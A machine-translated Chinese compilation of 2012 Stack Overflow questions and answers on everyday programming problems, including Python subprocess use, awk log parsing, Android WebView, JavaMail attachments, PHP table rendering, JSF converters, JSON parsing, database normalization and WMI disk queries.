我正在使用 GNU/Linux 和 python 2.7.3，我是新手。我正在尝试执行一个长时间安装的系统进程，比如`ffmpeg`使用`Popen()`命令来避免阻塞主要的 python 进程。我不能让它工作。

我的第一次尝试是使用线程，但它有点复杂，因为图形界面不能正常工作（我想必须有更好的方法）

然后我尝试了fork，但这就像用坦克杀死苍蝇一样。

现在我正在尝试使用`Popen`，我在互联网上看到了很多关于它使用的参考，但我认为我没有正确运行它。也许我误解了这些例子。

我试过了：

```
##command is ffmpeg like that works ok
p = subprocess.Popen(command, shell=True) 
```

我也试过：

```
p = subprocess.Popen(command,stdin=PIPE, shell=True) 
```

通常我得到一个错误或一个连续的行为，命令结束，然后主程序恢复。我错过了什么？

命令部分：

```
 global vidSource
    global srtSource
    global done
    size = "3"

    font = "/usr/share/fonts/truetype/freefont/FreeSerif.ttf"
    command = 'mencoder ' + '"' + vidSource + '"' + " -oac copy -ovc lavc -lavdopts threads=2 -sub " + "'" + srtSource + "'" + " -subcp -utf8 -font "+ '"'+ font+ '"' + " -subfont-text-scale " + size + " -o " + '"' + vidSource + '2'+'"' 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T14:16:24.600

你应该走在一个好的轨道上。只需使用

```
p = subprocess.Popen(command) 
```

您可以检查该过程是否以 结束`p.poll`，如[文档中所述](http://docs.python.org/library/subprocess.html)

请注意，`shell=True`不**推荐**使用（出于安全原因），因此您应该尽量不要使用它，除非您有充分的理由。

如文档中所述，您的`command`必须是参数**列表**。如果你构建一个长字符串，你应该使用`shlex.split(command)`它来将它转换为一个字符串，同时保留`"`来回（当然，你需要`import shlex`在你的模块中）。

# bash - 需要在bash中解析一个日志文件

> ID：12603606
> 
> 赞同：4
> 
> 时间：2012-09-26T14:07:42.683
> 
> 标签：bash, shell, awk

我有一个包含大量文本的日志文件，其中一些是无用的。在这个日志中有一些对我很重要的行。这些行的模式是：

```
 0x00000001 (NEEDED)                     Shared library: [libm.so.6]
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x00000001 (NEEDED)                     Shared library: [ld.so.1]
 0x00000001 (NEEDED)                     Shared library: [libgcc_s.so.1] 
```

NEEDED 关键字可以在对我很重要的所有行中找到。[] 之间的关键字对我来说很重要。我需要创建所有这些字符串的列表，而不是重复它们。

我已经在 Python 上完成了这项工作，但看起来在我想要运行脚本的机器上没有可用的 Python，所以我需要在 bash 中重新编写脚本。我只知道 bash 中的基本知识，我无法找到解决问题的方法。

我使用的 Python 脚本是：

```
import sys
import re

def testForKeyword(keyword, line):
    findStuff = re.compile(r"\b%s\b" % keyword, \
                                   flags=re.IGNORECASE)

    if findStuff.search(line):
        return True
    else:
        return False

# Get filename argument
if len(sys.argv) != 2:
    print("USAGE: python libraryParser.py <log_file.log>")
    sys.exit(-1)

file = open(sys.argv[1], "r")

sharedLibraries = []
for line in file:
    if testForKeyword("NEEDED", line):
        libraryNameStart = line.find("[") + 1
        libraryNameFinish = line.find("]")

        libraryName = line[libraryNameStart:libraryNameFinish]

        # No duplicates, only add if it does not exist
        try:
            sharedLibraries.index(libraryName)
        except ValueError:
            sharedLibraries.append(libraryName)

for library in sharedLibraries:
    print(library) 
```

你能帮我解决这个问题吗？提前致谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-26T14:18:27.640

```
$ awk -F'[][]' '/NEEDED/ {print $2}' data.txt | sort | uniq
ld.so.1
libc.so.6
libgcc_s.so.1
libm.so.6 
```

仅限awk：

```
$ awk -F'[][]' '/NEEDED/ {save[$5]++}END{ for (i in save) print i}' data.txt
libc.so.6
libm.so.6
libgcc_s.so.1
ld.so.1 
```

简化你的 python 代码：

```
#!/usr/bin/env python

libs = []

with open("data.txt") as fd:
    for line in fd:
        if "NEEDED" in line:
            libs.append(line.split()[4])

for i in set(libs):
    print i 
```

Bash 解决方案（没有唯一的库）

```
#!/bin/bash

while IFS='][' read -a array
do
    echo ${array[1]}
done < data.txt 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-26T14:34:48.827

`awk -F '[' ' /NEEDED/ { print $NF } ' file_name | sed 's/]//' | sort | uniq`

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-09-26T14:17:09.803

`awk`使用问题数据假设的一种方法`infile`：

```
awk '
    $2 ~ /NEEDED/ { 
        lib = substr( $NF, 2, length($NF) - 2 ); 
        libs[ lib ] = 1;
    } 
    END { 
        for (lib in libs) { 
            printf "%s\n", lib;
        } 
    }
' infile 
```

输出：

```
libc.so.6                                                                                                                                                                                                                                    
libgcc_s.so.1                                                                                                                                                                                                                                
ld.so.1                                                                                                                                                                                                                         
libm.so.6 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-09-26T14:25:19.387

`grep`和`coreutils`：_

```
grep NEEDED infile | grep -o '\[[^]]*\]' | tr -d '][' | sort | uniq 
```

输出：

```
ld.so.1
libc.so.6
libgcc_s.so.1
libm.so.6 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-26T14:17:16.653

```
 awk '/NEEDED/ {gsub("[][]", ""); print $5}' < /tmp/1.txt  | sort -u 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-09-26T14:17:19.217

如果您将日志保存在名为“log.txt”的文件中，则可以获取它：

```
grep "(NEEDED)" log.txt | awk -F"\[" '{print substr($2,0,length($2));}' - | sort -u 
```

使用 sort -u 你不会得到重复的行。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-09-26T14:22:09.000

sed 解决方案可能是：

```
sed -e '/(needed)/!d' -e 's/\(.*\[\)\|\(\]$\)//g' INPUTFILE 
```

*注意*，如果您在 Windows 上，正确的方法是：

```
sed -e '/(needed)/!d' -e 's/\(.*\[\)\|\(\].$\)//g' INPUTFILE 
```

1.  第一`-e`部分删除不匹配的每一行`(needed)`
2.  第二个删除直到最后一个`[`和最后一个`]`（以及在 Windows 上的`\r`（回车）之前的所有内容）`\n`但这不是问题，因为输出打印正确......

# android - 通过单击按钮在活动中加载 Web 视图

> ID：12603612
> 
> 赞同：0
> 
> 时间：2012-09-26T14:07:57.730
> 
> 标签：android, android-activity, webview

我想点击一个按钮，它会打开一个带有网络视图的活动。主要活动

```
package test.example.webviewtest;

import android.os.Bundle;
import android.app.Activity;
import android.content.Intent;
import android.widget.Button;

public class Main extends Activity {

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    Button page1 = (Button) findViewById(R.id.button1);
    Intent intent1 = new Intent (Main.this,WebViewPage.class);
    intent1.putExtra("page1", "file:///android_asset/1.html");
    Main.this.startActivity(intent1);

    Button page2 = (Button) findViewById(R.id.button1);
    Intent intent2 = new Intent (Main.this,WebViewPage.class);
    intent2.putExtra("page2", "file:///android_asset/2.html");
    Main.this.startActivity(intent2);

}   
} 
```

第二次活动

```
package test.example.webviewtest;

import android.app.Activity;
import android.os.Bundle;

public class WebViewPage extends Activity {
@Override
protected void onCreate(Bundle savedInstanceState) {
    // TODO Auto-generated method stub
    super.onCreate(savedInstanceState);
    setContentView(R.layout.webviewpage);

    mWebView = findViewById(R.id.webView1);
    Bundle extras = getIntent().getExtras();
    if (extras != null){
    String page1Url = extras.getString("page1");
    String page2Url = extras.getString("page2");
    if (page1Url != null)
    mWebView.loadUrl(page1Url);
    else if (page2Url != null)
    mWebView.loadUrl(page2Url);
    }
}

} 
```

在主要活动中没有问题，但在第二个活动中，3 处日食中的 mWebview 给了我错误。我应该怎么做才能解决这个问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:14:25.040

改变那条线

```
mWebView = findViewById(R.id.webView1); 
```

对此

```
WebView mWebView = (WebView) findViewById(R.id.webView1); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T14:18:22.317

以下链接为您提供了一种通过单击按钮在 Activity 中加载 webview 的解决方案。

[Android：如何在新屏幕中打开 webview](https://stackoverflow.com/questions/4857303/android-how-to-open-the-webview-in-a-new-screen)

# blob - BLOB 到 axapta 中的位图

> ID：12603615
> 
> 赞同：2
> 
> 时间：2012-09-26T14:08:11.253
> 
> 标签：blob, axapta, dynamics-ax-2009

我已将变量声明为
`Bitmap image;`
`Container storeImg;`

我正在存储图像，因为
`storeImg+= image;`
图像作为`BLOB`类型存储在*容器中*

稍后当我尝试在 Bitmap 变量中检索图像时，例如
`Bitmap image2;`
`image2 = conpeek(storeImg,1);`

我收到**“操作数不匹配错误”**
我的问题是我已将图像声明为位图并存储在容器中，那么当我尝试仅在位图数据类型中检索相同图像时为什么会出现错误？

*提前致谢。*

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-26T14:34:11.713

`Bitmap`扩展数据类型实际上是一个容器。

添加容器会产生连接，这可能是您的问题（部分）：

```
static void BitmapTest(Args _args)
{
    Bitmap image1 = [1,2,3];
    Bitmap image2 = [7,8,9];
    Container storeImg;
    ;
    storeImg += image1;
    storeImg += image2;
    print conlen(storeImg);
    pause;
} 
```

这将打印 6，而不是您可能假设的 2。

而且`blob`和`container`不是一回事：

```
static void BitmapTest(Args _args)
{
    BinData b = new BinData();
    Bitmap image1 = b.getData();
    Bitmap image2 = b.getData();
    Container storeImg;
    ;
    storeImg += image1;
    storeImg += image2;
    image2 = conpeek(storeImg,1);
    pause;
} 
```

这将失败，因为`storeImg`包含两个`blob`值。

将分配更改为：

```
 storeImg += [image1];
    storeImg += [image2]; 
```

这将起作用，因为现在 `storeImg`包含两个`container`值（包含 a `blob`）。

另请参阅[从容器字段加载和保存文件](https://stackoverflow.com/questions/8207240/axapta-load-and-save-file-from-and-to-container-field)

# java - 电子邮件缺少图像附件

> ID：12603617
> 
> 赞同：0
> 
> 时间：2012-09-26T14:08:14.453
> 
> 标签：java, email-attachments

我正在尝试从 Java 发送带有图像附件的电子邮件。我正在使用以下代码：

```
String to = "jverstry@gmail.com";
String from = "ffff@ooop.com";

// Which server is sending the email?
String host = "localhost";

// Setting sending mail server
Properties properties = System.getProperties();
properties.setProperty("mail.smtp.host", host);

// Providing email and password access to mail server
properties.setProperty("mail.user", "xxx");
properties.setProperty("mail.password", "yyy");

// Retrieving the mail session
Session session = Session.getDefaultInstance(properties);

// Create a default MimeMessage
MimeMessage message = new MimeMessage(session);

message.setFrom(new InternetAddress(from));
message.addRecipient(
    Message.RecipientType.TO, new InternetAddress(to));

message.setSubject("This an email test !!!");

// Create a multipart message
Multipart mp = new MimeMultipart();

// Body text
BodyPart messageBP = new MimeBodyPart();
messageBP.setText("Some message body !!!");
mp.addBodyPart(messageBP);

// Attachment
BodyPart messageBP2 = new MimeBodyPart();

String image = "/MyImage.jpg";
InputStream stream = EmailWithAttachment.class
    .getResourceAsStream(image);
DataSource source = new ByteArrayDataSource(stream, "image/*");

messageBP2.setDataHandler(new DataHandler(source));
messageBP2.setHeader("Content-ID", "My Image");
mp.addBodyPart(messageBP2);

message.setContent(mp);

// Sending the message
Transport.send(message); 
```

电子邮件到达我的邮箱，但是当我打开它时，附件不可用。什么可能导致这个问题？我检查了`.jar`它，它包含图像。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:26:17.370

好，我知道了。我不应该传递输入流，而是传递一个字节数组并设置更精确的 MIME 类型。我修改了我的代码如下，它可以工作：

```
DataSource source = new ByteArrayDataSource(
    IOUtils.toByteArray(is), "image/jpeg"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T14:13:56.537

```
 // Part two is attachment
     messageBodyPart = new MimeBodyPart();
     String filename = "file.txt";
     DataSource source = new FileDataSource(filename);
     messageBodyPart.setDataHandler(new DataHandler(source));
     messageBodyPart.setFileName(filename);
     multipart.addBodyPart(messageBodyPart); 
```

来源：[http ://www.tutorialspoint.com/java/java_sending_email.htm](http://www.tutorialspoint.com/java/java_sending_email.htm)

# php - 通过 PHP 循环运行表

> ID：12603619
> 
> 赞同：1
> 
> 时间：2012-09-26T14:08:21.037
> 
> 标签：php, html, arrays, loops

我有一个显示类别和子类别列表的表格，使用函数循环遍历父/子树。这是脚本的标记：

```
<table border="1" width="100%" cellspacing="0" cellpadding="2">
    <tr class="dataTableHeadingRow">
        <td class="dataTableHeadingContent"><?php echo TABLE_HEADING_PRODUCTS; ?></td>
        <td class="dataTableHeadingContent" align="right"><?php echo TABLE_HEADING_TOTAL_WEIGHT; ?>&nbsp;</td>
    </tr>

<?php
function category_list( $category_parent_id = 0 )
{
    // build our category list only once
    static $cats;

    if ( ! is_array( $cats ) )
    {
        $sql  = 'select cd.categories_name,c.categories_id, c.parent_id, c.sort_order from ' . TABLE_CATEGORIES . ' c, ' . TABLE_CATEGORIES_DESCRIPTION . ' cd where c.categories_id = cd.categories_id';
        $res  = tep_db_query( $sql );
        $cats = array();

        while ( $cat = tep_db_fetch_array( $res ) )
        {
            $cats[] = $cat;
        }
    }

    // populate a list items array
    $list_items = array();

    foreach ( $cats as $cat )
    {
        // if not a match, move on
        if ( ( int ) $cat['parent_id'] !== ( int ) $category_parent_id )
        {
            continue;
        }

        // open the list item
        $list_items[] = '<tr class="dataTableRow">';
        $list_items[] = '<td class="dataTableContent"><li>';

        // construct the category link

        $list_items[] = $cat['categories_name'];

        // recurse into the child list
        $list_items[] = category_list( $cat['categories_id'] );

        // close the list item
        $list_items[] = '</li></td>';
        $list_items[] = '</tr>';
    }

    // convert to a string
    $list_items = implode( '', $list_items );

    // if empty, no list items!
    if ( '' == trim( $list_items ) )
    {
        return '';
    }

    // ...otherwise, return the list
    return '<ul>' . $list_items . '</ul>';
}  

echo category_list();
?>
        <td class="dataTableContent"></td>
</table> 
```

目前，这当前正确打印`<tr class="dataTableHeadingRow">`和`<td class="dataTableHeadingContent">`，但对于`<td class="dataTableContent">`，它仅正确打印函数中的标签。如何正确打印两个 dataTableContent 标签，并将它们都保持在循环中？ ![在此处输入图像描述](../Images/dde160670fd9983851ae1feca3ba17cf.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:30:55.613

查看您对函数的递归使用，`category_list`您将*在*s中输出`<tr>`元素。这是无效的 HTML。 *`<li>`*

 *此外，`<tr>`正文中的每个只有一个单元格，而`<tr>`标题行中的每个单元格都有两个单元格。

您应该考虑输出的外观，然后编写代码来说明这一点，并按照流程查看正在写出的内容。此外，检查返回给浏览器的实际 HTML 源代码，而不是浏览器呈现它的方式。请注意，不同的浏览器会以不同的方式呈现无效的 HTML。

此外，（与您的问题无关）考虑用 CSS 替换`border`、`width`、`cellspacing`和HTML 属性。另一个考虑是使用and元素作为附加的语义标记。`cellpadding``align``<head>``<tbody>`

**进一步说明**

您的问题本质上是以下几行：

```
 // open the list item
    $list_items[] = '<tr class="dataTableRow">';
    $list_items[] = '<td class="dataTableContent"><li>';

    // construct the category link

    $list_items[] = $cat['categories_name'];

    // recurse into the child list
    $list_items[] = category_list( $cat['categories_id'] );

    // close the list item
    $list_items[] = '</li></td>';
    $list_items[] = '</tr>'; 
```

循环的每次迭代都在创建一个新`tr`元素！试试这个：

```
<table border="1" width="100%" cellspacing="0" cellpadding="2">
    <tr class="dataTableHeadingRow">
        <td class="dataTableHeadingContent"><?php echo TABLE_HEADING_PRODUCTS; ?></td>
        <td class="dataTableHeadingContent" align="right"><?php echo TABLE_HEADING_TOTAL_WEIGHT; ?>&nbsp;</td>
    </tr>
    <tr class="dataTableRow">
    <td class="dataTableContent">
<?php
function category_list( $category_parent_id = 0 )
{
    // NOTE THE ADDITIION OF THE PARENT ID:
    $sql  = 'select cd.categories_name,c.categories_id, c.parent_id, c.sort_order from ' . TABLE_CATEGORIES . ' c, ' . TABLE_CATEGORIES_DESCRIPTION . ' cd where c.categories_id = cd.categories_id AND c.parent_id='.$category_parent_id;
    $res  = tep_db_query( $sql );
    $cats = array();

    while ( $cat = tep_db_fetch_array( $res ) )
    {
        $cats[] = $cat;
    }

   if (count($cats) == 0)
   {
      // There are no categories to list
      return '';
   }

    // Create a list HTML string
    $list = '<ul>';

    foreach ( $cats as $cat )
    {
        // open the list item
        $list .= '<li>';

        // construct the category link

        $list .= $cat['categories_name'];

        // recurse into the child list
        $list .= category_list( $cat['categories_id'] );

        // close the list item
        $list .= '</li>';
    }

    // close and return the list
    $list .= '</ul>';
    return $list;

}  

echo category_list();
?>
        </td>
        <td class="dataTableContent"></td>
    </tr>
</table> 
```

请注意，可以对数据和表示逻辑分离进行进一步改进。您不一定需要采用全面的 MVC 框架；只需使用 OOP 将您的 SQL 查询封装在代表您的数据库实体的类中。

**编辑**

*遵循规范，每个类别都应该有自己的`<td>`.*

这需要删除列表元素。A`<ul>`只能包含`<li>`子元素；它不能包含`<tr>`孩子。A`<td>`必须是 a 的子级`<tr>`。其他任何地方都不允许这样做。A`<tr>`只能是 a `<thead>`、`<tbody>`* 或的子级`<tfoot>`。这些规则都在[HTML DTD](http://www.w3.org/TR/html4/sgml/dtd.html)中定义。

因此，以下是您需要查看的内容：

```
<table border="1" width="100%" cellspacing="0" cellpadding="2">
    <tr class="dataTableHeadingRow">
        <td class="dataTableHeadingContent"><?php echo TABLE_HEADING_PRODUCTS; ?></td>
        <td class="dataTableHeadingContent" align="right"><?php echo TABLE_HEADING_TOTAL_WEIGHT; ?>&nbsp;</td>
    </tr>
<?php
function category_list( $category_parent_id = 0, $level = 0 )
{
    // NOTE THE ADDITIION OF THE PARENT ID:
    $sql  = 'select cd.categories_name,c.categories_id, c.parent_id, c.sort_order from ' . TABLE_CATEGORIES . ' c, ' . TABLE_CATEGORIES_DESCRIPTION . ' cd where c.categories_id = cd.categories_id AND c.parent_id='.$category_parent_id;
    $res  = tep_db_query( $sql );
    $cats = array();

    while ( $cat = tep_db_fetch_array( $res ) )
    {
        $cats[] = $cat;
    }

    $list = '';
    foreach ( $cats as $cat )
    {
        // start the next row:
        $list .= "<tr class=\"dataTableRow\">\n";
        // The cell for the category needs
        $list .= "<td class=\"dataTableContent\">\n";

        // construct the category link.  Note we are now enclosing 
        // this in a div with a left-indent to show the sub level
        // this category is at.  Adjust the padding-left calculation 
        // to suit your page
        $list .= '<div style="padding-left: ' . (2 * $level) . 'em;">';
        $list .= "&bull; {$cat['categories_name']}";
        $list .= "</div>\n";

        // close the row
        $list .= "</td>\n";
        $list .= "<td class=\"dataTableContent\"></td>\n";
        $list .= "</tr>\n";

        // recurse into the child list, incrementing $level
        $list .= category_list( $cat['categories_id'], 1+$level );
    }

    // return the list
    return $list;

}

echo category_list();
?>
</table> 
```

*请注意，这`<tbody>`是一个*隐含*的元素。它不必在代码中显式定义，但它始终存在于 DOM 中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T14:31:35.570

要遍历数组并将内容显示为表格的一部分，我会将您的业务逻辑与显示逻辑分开一点。我的解决方案如下所示：

```
<!-- populate the array of data to be displayed -->
<?php $list_items = category_list(); ?>

<!-- start the table, display header rows -->
<table border="1" width="100%" cellspacing="0" cellpadding="2">
<tr class="dataTableHeadingRow">
    <td class="dataTableHeadingContent"><?php echo TABLE_HEADING_PRODUCTS; ?></td>
    <td class="dataTableHeadingContent" align="right"><?php echo TABLE_HEADING_TOTAL_WEIGHT; ?>&nbsp;</td>
</tr>
<tr class="dataTableRow">
<td class="dataTableContent">

<ul>
    <!-- iterate over data array, create ul for each member -->
    <?php 
        foreach($list_items as $item) {
    ?>
        <li><?php print $item ?></li>
    <?php
        }
    ?>
</ul>

<!-- finish the table -->
</td>
</tr>
</table>

<!-- define function which will populate your array -->
<?php
function category_list( $category_parent_id = 0 )
{
    /* 
      this function will look very similar to the one in the 
      one in the original post but will just return the whole
      array instead of printing out one member.
    */

    // populate $items_list...
    return $items_list;
}
?> 
```

请注意，我没有测试这个不完整的代码，但这个想法应该是正确的。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-09-26T14:52:01.340

尝试替换以下代码：

```
 $list_items[] = '<tr class="dataTableRow">';
    $list_items[] = '<td class="dataTableContent"><li>'; 
```

和：

```
 $list_items[] = "<tr class='dataTableRow'>";
    $list_items[] = "<td class='dataTableContent'><li>"; 
```*

# jsf - 为什么 f:convertDateTime 不转换 p:selectOneMenu 的标签？

> ID：12603632
> 
> 赞同：3
> 
> 时间：2012-09-26T14:08:43.887
> 
> 标签：jsf, primefaces, converter

为什么我`List<Date>`没有得到转变？项目`<p:selectOneMenu>`模式看起来像 `Thu Mar 01 00:00:00 BRT 2012`而不是所需的“MM/yyyy”。

```
<p:selectOneMenu value="#{report003.selectedMes}">
  <p:ajax update="pesquisaThomas" listener="#{report003.loadPesquisa()}" />
  <f:selectItem itemLabel="[Todos]" itemValue="" />
  <f:convertDateTime pattern="MM/yyyy" />
  <f:selectItems value="#{report003.pesquisaMeses}" />
</p:selectOneMenu> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-26T15:00:37.960

转换仅适用于项目**值**，不适用于项目**标签**。标签只是使用默认[`Date#toString()`](http://docs.oracle.com/javase/6/docs/api/java/util/Date.html#toString%28%29)模式呈现。

您最好的选择是*创建*一个`List<SelectItem>`而不是`List<Date>`您自己转换项目标签，

```
List<Date> availableDates = ...;
List<SelectItem> selectItems = ...;
SimpleDateFormat sdf = new SimpleDateFormat("MM/yyyy");

for (Date availableDate : availableDates) {
    selectItems.add(new SelectItem(availableDate, sdf.format(availableDate)));
} 
```

*或*`<f:selectItems var>`在`itemValue`. _ 例如，[OmniFaces`of:formatDate()`](http://showcase.omnifaces.org/functions/Dates)（或[自制](https://stackoverflow.com/questions/7079978/how-to-create-a-custom-el-function/7080174#7080174)的）。

```
<f:selectItems value="#{bean.availableDates}" var="date" 
    itemValue="#{date}" itemLabel="#{of:formatDate(date, 'MM/yyyy')}" /> 
```

顺便说一下，这个问题不是特定的`<p:selectOneMenu>`，使用标准时您会遇到完全相同的问题`<h:selectOneMenu>`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-18T19:35:26.803

试试这个：

托管豆

```
private SimpleDateFormat sdf;
(...)

@PostConstruct
public void init(){
    sdf = new SimpleDateFormat("MM/yyyy");
}

public SimpleDateFormat getSdf(){
    return sdf;
}

public void setSdf(SimpleDateFormat sdf){
    this.sdf = sdf;
} 
```

xhtml

```
<p:selectOneMenu value="#{report003.selectedMes}">
    <p:ajax update="pesquisaThomas" listener="#{report003.loadPesquisa()}" />
    <f:selectItem itemLabel="[Todos]" itemValue="" />
    <f:selectItems value="#{report003.pesquisaMeses}"
                   var="mes" itemValue="#{mes}"
                   itemLabel="#{myMB.sdf.format(mes)}" /> 
```

# iphone - 如何在 iPhone 中解析 Json 文件？

> ID：12603633
> 
> 赞同：0
> 
> 时间：2012-09-26T14:08:52.420
> 
> 标签：iphone, json, parsing

目前我在 iPhone 应用程序中工作，使用 SBJson 来解析来自 web 服务的 Json 响应，但我没有解析它。

这里我提到了 SBJson 文件供您参考：

```
 Array
    (
        [0] => 21
        [s.no] => 21
        [1] => Table243322
        [table_id] => Table424242
        [2] => arun123
        [username] => aru22n123
        [3] => sam101
        [friend_user_name] => sa323m101
        [4] => 0
        [game_status] => 0
    )
    {"status":"1","error":{"0":"Table1684242538","table_id":"Table168424538","1":"KH,AC,10S,8D,2C,4H,JH,3S,10C,7D,3C,4D,7S","play_cards1":"KH,AC,10S,8D,2C,4H,JH,3S,10C,7D,3C,4D,7S","2":"QH,8H,2D,AS,KC,3D,6D,QD,9D,3H,2H,JD,AH","play_cards2":"QH,8H,2D,AS,KC,3D,6D,QD,9D,3H,2H,JD,AH","3":"10H","joker_card":"10H","4":"7C","open_deck":"7C","5":"AD,4C,9S,6S,QC,5C,8C,2S,4S,KS,5D,JS,RJ2,6H,JC,6C,9H,KD,10D,7H,QS,9C,5S,5H,RJ1,8S","closed_decks":"AD,4C,9S,6S,QC,5C,8C,2S,4S,KS,5D,JS,RJ2,6H,JC,6C,9H,KD,10D,7H,QS,9C,5S,5H,RJ1,8S"}} 
```

我试图解析这个，但值是空的：

```
-(void)connectionDidFinishLoading:(NSURLConnection *)connection
{
    NSString *jsonStr1 = [[NSString alloc] initWithData:mutaebleData encoding:NSUTF8StringEncoding]; 
    NSLog(@"jsonStr1 : %@", jsonStr1);

    SBJSON *Json = [[SBJSON alloc]init];
    NSDictionary *dic= (NSDictionary *) [Json objectWithString:jsonStr1 error:nil];  

        // dic = null, dic value comes always null
} 
```

如何解析这个？请帮我

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:16:47.107

保证您的应用程序在未来版本中使用 Apple 的库/类（只是一个建议）。如果您使用[NSJSONSerialization](http://developer.apple.com/library/ios/#documentation/Foundation/Reference/NSJSONSerialization_Class/Reference/Reference.html)解决方案将如下所示..

```
// 1) data is an ivar of NSData
// 2) i used delegate methods of NSURLConnection to fetch data from server
  NSError *error=nil;
  id result=[NSJSONSerialization JSONObjectWithData:data options:
            NSJSONReadingMutableContainers error:&error];
// use result as how you want. you can use NSDictionary too instead of id .. 
```

# database - 多个重复的列 - 有效的规范化？

> ID：12603638
> 
> 赞同：0
> 
> 时间：2012-09-26T14:09:10.813
> 
> 标签：database, database-design, normalization

我想知道以下内容是否对 1NF/2NF/3NF 有效。我需要将多个“位置 ID”存储在一个表中（对于需要列出多个位置的链接表）。阅读 about.com 上的文章（[此处](http://databases.about.com/od/specificproducts/a/firstnormalform.htm)）后，看来我不能使用重复的列，IE，

```
LinkedLocationID (referenced from another table)  
LocationID1 
LocationID2  
LocationID3 
```

我不能使用非原子领域，IE，

```
LinkedLocationID
LocationIDs 
```

那么，如何在不破坏 1NF 的情况下包含三个重复列？我既需要为 Location 存储多个值，又需要使我的数据库符合 3NF。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T14:15:52.260

您应该有一个单独的 LinkedLocationLocations 表，每个组合都有一行

所以使用你的第一个例子

```
LinkedLocationID | LocationIDs
1                | A,B
2                | B,C 
```

变成

```
LinkedLocationID | LocationID
1                | A
1                | B
2                | B
2                | C 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T14:15:58.673

您在两个实体之间使用交叉表，如下所示：

```
Item
=====
ItemID
...

ItemLocation
============
ItemID
LocationID
...

Location
========
LocationID
... 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-26T14:17:34.470

您的问题缺少您要链接的内容，但经典的解决方案是

```
Thingies
ThingyID
...

Locations
LocationID
...

ThingyLocations
ThingyID FK to Thingies
LocationID to Locations 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-26T14:18:20.927

“有效”可能不是正确的思考方式。有很多问题，有些问题不正常化是有道理的。在我看来，如何使用数据更重要。

现在，如果规范化是您唯一关心的问题，那么您不应该将三个 LocationID 存储在一个表中。您需要一个将 LocationID 链接到 LinkedLocationID 的表。所以该表可能如下所示：

```
LocationLinkedLocationId - LinkedLocationID - LocationID
1                          1                  1
2                          1                  2
3                          2                  1
4                          3                  1 
```

# c# - 如何从远程计算机的驱动器中获取可用的 FreeSpace？

> ID：12603641
> 
> 赞同：4
> 
> 时间：2012-09-26T14:09:18.410
> 
> 标签：c#, wmi, wmi-query

我正在尝试从远程计算机的 D 盘获取 FreeSpace。

最后，我得到一个 ManagementException 未被用户代码“未找到”处理

这是给我错误的行： fs = m["FreeSpace"].ToString();

这是我的代码：

```
ConnectionOptions oConn = new ConnectionOptions();

oConn.Username = "username";
oConn.Password = "password";
oConn.Authority = "ntlmdomain:XXX";

ManagementScope scope = new ManagementScope("\\\\Remote_Computer\\root\\CIMV2", oConn);

scope.Connect();

ObjectQuery query = new ObjectQuery("SELECT DeviceID, VolumeName FROM Win32_LogicalDisk where DeviceID = 'D:'");

ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);

ManagementObjectCollection queryCollection = searcher.Get();

foreach (ManagementObject m in queryCollection)
{
      //error happens here
      fs = m["FreeSpace"].ToString();

      freeSpace = Convert.ToInt64(fs);
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T14:15:23.807

我发现了问题所在。

我的查询是错误的。我将其替换为：

```
"SELECT FreeSpace FROM Win32_LogicalDisk where DeviceID = 'D:'" 
```

并且问题解决了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T14:24:46.533

相信这篇[文章](https://stackoverflow.com/questions/137255/how-can-i-determine-if-a-remote-drive-has-enough-space-to-write-a-file-using-c)应该会给你一个答案！！

基本上，它归结为以下两种方法之一：

要么导入 GetDiskFreeSpaceEx 并在驱动器路径上使用它，要么在预先连接的网络驱动器上使用 WMI。

因此，您需要对该驱动器进行网络访问。

如果您正在尝试监控远程系统，您可以轻松创建一个小型应用程序/服务，该应用程序/服务将在该计算机上运行并不断收集所需信息，然后使用 WCF 之类的东西将其提供给监控应用程序，或者甚至直接连接（如果您）想。

让我知道这是否有帮助，

最大限度

**编辑：** 实际上，我误解了你的问题。我以为你首先在寻找一种连接方式。不过，我会将这个答案留在这里，以便任何通过搜索找到这个答案的人都可能会发现它很有用。

# android - 签名的apk行为怪异

> ID：12603646
> 
> 赞同：0
> 
> 时间：2012-09-26T14:09:46.437
> 
> 标签：android

最近我为运行 android 4.0.3 的三星 tab 2 开发了一个启动器应用程序。在开发/调试期间，一切都运行良好。但是当我创建一个发布/签名的 apk 时，我们开始遇到字体渲染和系统主页按钮无法正常工作的问题。

在升级到 4.0.4 的同一台平板电脑上再次对其进行了测试，一切都很好。谁能告诉我为什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:37:39.270

我相信 Galaxy Tab 2 将其像素密度报告为 170dpi 和 4.0.3 的 hdpi 屏幕桶。这已在 4.0.4 中修复为报告为 mdpi。我个人知道这一点，因为我在开发一个漫画阅读器应用程序，这是一个痛苦的补偿。

